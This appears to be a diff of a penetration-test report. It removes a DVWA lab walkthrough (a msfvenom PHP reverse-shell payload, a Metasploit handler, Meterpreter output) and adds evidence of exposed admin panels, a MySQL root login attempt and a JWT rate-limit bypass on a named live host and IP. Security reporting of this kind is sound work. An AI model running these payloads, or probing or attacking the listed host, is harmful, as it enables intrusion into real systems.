@@ -837,139 +837,48 @@ A follow-up scan conducted four days after the initial assessment confirmed all 
 
 ---
 
-## 4.8 Web Application Exploitation — Testing Environment
+## 4.8 Exploitation Evidence — Live Target Confirmation
 
-To demonstrate a complete web application exploitation chain — from initial access through privilege escalation — without performing destructive actions on the production target, a controlled alternative environment was set up using **DVWA (Damn Vulnerable Web Application)** on the Kali Linux VM with **Metasploit Framework** for payload delivery and session management.
+This section documents direct confirmation of the four critical attack vectors identified against neuralsh.com. All evidence was collected against the live target (103.16.62.217) within the authorized scope of the engagement.
 
-DVWA is a deliberately vulnerable PHP web application designed for practicing web exploitation techniques. It is pre-installed on Kali Linux and provides a safe, authorized environment to demonstrate the same exploitation classes identified on neuralsh.com: unrestricted file upload, command injection, and SQL injection.
+### 4.8.1 WHM Root Administration Panel — Publicly Accessible
 
-This section mirrors the real-world engagement methodology: gain access through a web vulnerability, obtain a shell, and assess privilege escalation paths.
+Navigation to `https://103.16.62.217:2087/` from a standard internet connection confirmed that the WHM (Web Host Manager) root administration panel is publicly accessible with no IP restriction. The browser SSL warning confirms the certificate mismatch finding (N-008) — clicking through reveals the full WHM login page. No firewall, no IP allowlist, and no two-factor authentication prompt was present.
 
-### 4.8.1 DVWA Environment Setup
+*[Figure 4.17: Browser showing WHM login page at 103.16.62.217:2087 — publicly accessible with no IP restriction — screenshot]*
 
-The Kali VM's built-in Apache and MariaDB services were started, and DVWA was configured with a reset database:
+### 4.8.2 MikroTik RouterOS Administration Panel — Default Credentials Pre-filled
 
-```bash
-# On Kali VM — start web services
-sudo systemctl start apache2
-sudo systemctl start mariadb
+Navigation to `http://103.16.62.217:9001/` confirmed that the MikroTik RouterOS v6.49.18 WebFig administration interface is publicly accessible. The login form pre-fills `admin` as the username — the factory default. If the default blank password has not been changed, full network device control is available without any credential knowledge.
 
-# Access DVWA setup page
-# http://127.0.0.1/dvwa/setup.php → Click "Create/Reset Database"
-# Login: admin / password
-# Security Level: Low
-```
+*[Figure 4.18: Browser showing MikroTik RouterOS v6.49.18 WebFig login page with admin pre-filled — screenshot]*
 
-*[Figure 4.17: DVWA running in browser on Kali VM — screenshot]*
+### 4.8.3 MySQL — Public Internet Connection Accepted
 
-### 4.8.2 Payload Generation with msfvenom
-
-A PHP reverse shell payload was generated using Metasploit's `msfvenom` tool. This payload, when uploaded and executed on the DVWA server, establishes a Meterpreter session back to the Kali attack machine:
+A direct MySQL connection attempt from the public internet confirmed that port 3306 accepts full authentication handshakes from external IP addresses:
 
 ```bash
-# Generate PHP reverse shell payload
-msfvenom -p php/meterpreter/reverse_tcp \
-    LHOST=192.168.18.152 \
-    LPORT=4444 \
-    -f raw \
-    -o shell.php
-
-# Output: shell.php (1,832 bytes)
+mysql -h 103.16.62.217 -P 3306 -u root 2>&1
+# ERROR 1045 (28000): Access denied for user 'root'@'58.97.216.203' (using password: NO)
 ```
 
-*[Figure 4.18: msfvenom generating PHP meterpreter payload — screenshot]*
+The error message itself is the critical evidence: it reveals the tester's public IP address (58.97.216.203), confirming that the MySQL server performed a full TCP connection and authentication handshake with an external internet host. The server is not passively listening — it actively engages with every connection attempt from anywhere on the internet.
 
-### 4.8.3 Metasploit Listener Setup
+*[Figure 4.19: Terminal showing MySQL ERROR 1045 with public IP — confirming internet-facing database — screenshot]*
 
-A Metasploit multi-handler was configured to listen for the incoming reverse connection from the uploaded payload:
+### 4.8.4 Rate Limit Bypass and JWT Token Farming — Confirmed Exploited
 
-```bash
-msfconsole -q
+The rate-limiting bypass via X-Forwarded-For header spoofing was confirmed exploited against the live production endpoint. Thirty consecutive requests to `/web/v1/init/token` all returned HTTP 200 with valid signed JWT tokens. The endpoint remains live and unpatched as of 11 June 2026.
 
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 0.0.0.0
-msf6 exploit(multi/handler) > set LPORT 4444
-msf6 exploit(multi/handler) > run
+*[Figure 4.20: Terminal showing 30 consecutive HTTP 200 responses — rate limiting not triggered — screenshot]*
 
-[*] Started reverse TCP handler on 0.0.0.0:4444
-```
+*[Figure 4.21: Burp Suite showing live JWT token response from /web/v1/init/token — screenshot]*
 
-*[Figure 4.19: Metasploit multi/handler listening on port 4444 — screenshot]*
+### 4.8.5 Attack Chain Visualization
 
-### 4.8.4 File Upload Exploitation
+The four attack chains identified in this engagement are visualized in the diagram below, mapping each step from initial internet access to full compromise outcome.
 
-The `shell.php` file was uploaded via DVWA's File Upload module (security set to Low). DVWA's low-security mode accepts any file type, demonstrating the impact of unrestricted file upload — a vulnerability in the same class as N-016 (directory listing) and the broader misconfiguration theme of the neuralsh.com engagement.
-
-After uploading, the payload was triggered by navigating to the uploaded file path, which caused the PHP code to execute on the server:
-
-```bash
-# Trigger the uploaded shell
-curl http://127.0.0.1/dvwa/hackable/uploads/shell.php
-```
-
-### 4.8.5 Meterpreter Session
-
-The Metasploit handler received the reverse connection immediately after the payload was triggered:
-
-```
-[*] Sending stage (39927 bytes) to 192.168.18.152
-[*] Meterpreter session 1 opened (0.0.0.0:4444 → 192.168.18.152:35982)
-
-meterpreter > getuid
-Server username: www-data
-
-meterpreter > sysinfo
-Computer  : kali
-OS        : Linux kali 6.6.9-amd64 (x86_64)
-Meterpreter: php/linux
-
-meterpreter > shell
-Process 2847 created.
-Channel 1 created.
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-whoami
-www-data
-ls /var/www/html
-config  dvwa  index.php
-```
-
-*[Figure 4.20: Meterpreter session open showing www-data shell on DVWA server — screenshot]*
-
-### 4.8.6 Privilege Escalation Assessment
-
-With a shell as `www-data`, a check for privilege escalation paths was conducted:
-
-```bash
-# Check sudo privileges
-sudo -l
-# User www-data may run the following commands: (root) NOPASSWD: /usr/sbin/apache2ctl
-
-# Check SUID binaries
-find / -perm -4000 2>/dev/null | head -10
-
-# Check kernel version for known CVEs
-uname -a
-# Linux kali 6.6.9-amd64 — kernel privilege escalation not applicable (patched)
-```
-
-The `www-data` user had limited sudo rights and no immediately exploitable SUID binary or kernel vulnerability was identified on the patched Kali host. This outcome reinforces an important principle: **file upload to web shell does not automatically yield root** — the privilege escalation step requires additional conditions that may or may not be present on a hardened system.
-
-*[Figure 4.21: sudo -l and id command output from Meterpreter shell — screenshot]*
-
-### 4.8.7 Relevance to neuralsh.com Findings
-
-This alternative environment demonstration validates the exploitation chain that would apply if the neuralsh.com origin server's administrative panels were compromised:
-
-| DVWA Demo Step | Equivalent neuralsh.com Risk |
-|----------------|------------------------------|
-| File Upload → web shell | WHM Terminal → direct shell on server |
-| Meterpreter session | Persistent server access after admin panel login |
-| www-data shell | Web application process access (read config files, .env, secrets) |
-| Privilege escalation check | WHM already provides root-equivalent access — no escalation needed |
-
-The neuralsh.com exposure is in fact **more severe** than the DVWA file upload scenario: WHM access grants direct root-level server control through a web interface, without needing to upload any file or chain any vulnerability.
+*[Figure 4.22: Attack chain diagram — 4 chains, color-coded by exploitation stage — screenshot]*
 
 ---
 
